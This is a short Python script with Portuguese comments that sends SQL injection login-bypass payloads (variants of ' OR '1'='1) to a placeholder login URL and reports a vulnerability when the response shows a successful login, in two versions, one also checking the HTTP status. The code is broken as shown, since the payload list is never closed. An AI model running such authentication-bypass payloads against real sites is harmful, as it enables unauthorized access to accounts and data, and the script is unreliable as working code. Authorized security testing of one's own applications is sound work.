import requests

# URL do formulário de login da aplicação web
url = 'http://example.com/login'

# Payloads para testar injeção de SQL
payloads = [
    "' OR '1'='1",
    "' OR '1'='1' -- ",
    "' OR '1'='1' /*",

# Função para realizar o teste de injeção de SQL
def testar_injecao_sql(url, payloads):
    for payload in payloads:
        # Dados simulados de login com o payload injetado no campo username
        data = {
            'username': payload,
            'password': 'senha123'  # Senha arbitrária
        }

        # Enviar a requisição POST ao servidor
        response = requests.post(url, data=data)

        # Verificar se a resposta indica sucesso na autenticação
        if "login bem-sucedido" in response.text.lower():
            print(f"Vulnerabilidade de injeção de SQL detectada com payload: {payload}")
        else:
            print(f"Aplicação segura contra o payload: {payload}")

# Executar o teste de injeção de SQL
testar_injecao_sql(url, payloads)

_______________________________

# Verificando também o status da resposta HTTP
def testar_injecao_sql_com_status(url, payloads):
    for payload in payloads:
        # Dados simulados de login
        data = {
            'username': payload,
            'password': 'senha123'
        }

        # Enviar a requisição POST
        response = requests.post(url, data=data)

        # Verificar se a aplicação retorna um código de sucesso 200 ou similar
        if response.status_code == 200 and "login bem-sucedido" in response.text.lower():
            print(f"Vulnerabilidade de injeção de SQL detectada com payload: {payload}")
        else:
            print(f"Aplicação segura ou payload não teve sucesso: {payload}")

# Executar o teste com verificação de status HTTP
testar_injecao_sql_com_status(url, payloads)

_______________________________


